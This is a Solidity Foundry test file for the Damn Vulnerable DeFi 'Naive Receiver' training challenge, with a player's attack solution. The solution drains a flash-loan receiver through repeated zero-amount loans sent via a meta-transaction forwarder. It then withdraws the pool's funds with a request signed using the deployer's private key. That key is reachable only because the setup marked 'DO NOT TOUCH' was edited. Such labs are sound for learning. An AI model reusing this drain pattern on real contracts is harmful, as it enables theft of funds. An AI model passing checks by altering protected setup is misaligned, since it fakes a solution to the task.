// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;
    uint256 deployerKey;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        (deployer, deployerKey) = makeAddrAndKey("deployer");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    function _signRequest(
        BasicForwarder.Request memory req
    ) internal view returns (bytes memory sig) {
        bytes32 digest = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                keccak256(
                    abi.encode(
                        forwarder.getRequestTypehash(),
                        req.from,
                        req.target,
                        req.value,
                        req.gas,
                        req.nonce,
                        keccak256(req.data),
                        req.deadline
                    )
                )
            )
        );
          if (req.from == player) {
                (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
                return abi.encodePacked(r, s, v);
            } else if (req.from == deployer) {
                (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerKey, digest);
                return abi.encodePacked(r, s, v);
            } else {
                revert("unknown signer");
            }
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // write an onflashloan to borrow on the reciever behanlf using a for loop
        // when the reciever is drained flashloan the entire amount from the fool
        // send that amount to the recovery address and repay back with 0 to end the flashloan transacrtion
        for (uint256 i = 0; i < 10; i++) {
            bytes memory data = abi.encodeWithSelector(
                NaiveReceiverPool.flashLoan.selector,
                receiver,
                address(weth),
                0,          // borrow 0
                bytes("")
            );
            BasicForwarder.Request memory req = BasicForwarder.Request({
                from: player,
                target: address(pool),
                value: 0,
                gas: 1_000_000,
                nonce: forwarder.nonces(player),
                data: data,
                deadline: block.timestamp + 1 days
            });
            bytes memory sig = _signRequest(req);
                forwarder.execute(req, sig);
            }


            uint256 poolBalance = weth.balanceOf(address(pool));
            bytes memory withdrawData = abi.encodeWithSelector(
                NaiveReceiverPool.withdraw.selector,
                poolBalance,
                recovery
            );
            BasicForwarder.Request memory request = BasicForwarder.Request({
                from: deployer,     
                target: address(pool),
                value: 0,
                gas: 1_000_000,
                nonce: forwarder.nonces(deployer),
                data: withdrawData,
                deadline: block.timestamp + 1 days
            });

            bytes memory signature = _signRequest(request);
            forwarder.execute(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
